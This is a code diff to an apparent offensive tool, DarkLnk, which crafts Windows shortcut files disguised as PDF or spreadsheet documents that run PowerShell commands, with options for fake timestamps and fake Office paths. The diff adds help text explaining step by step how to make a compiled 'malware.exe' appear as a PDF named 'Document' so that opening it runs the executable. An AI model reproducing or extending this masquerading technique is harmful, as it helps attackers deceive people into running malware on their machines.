@@ -111,7 +111,14 @@ namespace DarkLnk
             Console.WriteLine(@" DarkLnk.exe -o Report -ext pdf -argsb64 LWNvbW1hbmQgIm1rZGlyICJ0ZXN0IiI=");
             Console.WriteLine(@" DarkLnk.exe -o Report -ext pdf -args ""-command mkdir test""");
             Console.WriteLine(@" DarkLnk.exe -o Payroll -ext xlsx -args ""mkdir test"" -padrand -faketime -fakepath ""Microsoft Office 365""");
-            Environment.Exit(0);
+            Console.WriteLine();
+            Console.WriteLine("How to make a C++ EXE look like a PDF:");
+            Console.WriteLine("  1. First compile your C++ code to an EXE (e.g., malware.exe)");
+            Console.WriteLine("  2. Run: DarkLnk.exe -o Document -ext pdf -args \"-command \\\"& '.\\malware.exe'\\\"\"");
+            Console.WriteLine("  This creates Document.lnk that appears as a PDF but runs your C++ EXE via PowerShell");
+            Console.WriteLine();
+            Console.WriteLine("Press any key to exit...");
+            Console.ReadKey();
         }
 
 
